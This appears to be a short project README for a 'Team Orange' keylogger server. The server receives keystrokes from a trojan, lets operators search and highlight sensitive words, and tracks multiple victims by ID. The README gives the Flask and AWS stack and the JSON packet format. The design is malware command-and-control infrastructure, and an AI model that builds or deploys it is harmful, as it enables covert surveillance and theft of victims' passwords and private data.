# Team Orange Keylogger Web Server

### Priorities
- Receive keystrokes from the trojan horse
- Allow for searching of keywords
- Allow for automatic highlighting of sensitive words
- Allow for real-time updating
- Support multiple keyloggers running at the same time (Multiple users)

### Framework
- Web framework: Flask (Frontend written in plain JS / HTML / CSS. API written in python)
- Deployment: Docker on AWS EC2/ECR/ECS
- Database - SQL server running on RDS




### Packet format for communication to web server: JSON or form
```
{
user_id: "my_victim_id_123, can be a long random number unique to each user (should not change on reboot)", 
session_id: "random number that is reset every time the process starts"
time: "12:00:00 1/2/3"
keystroke: "SHIFTUP"
key_count: # of keystrokes that have been sent since session started
}
```
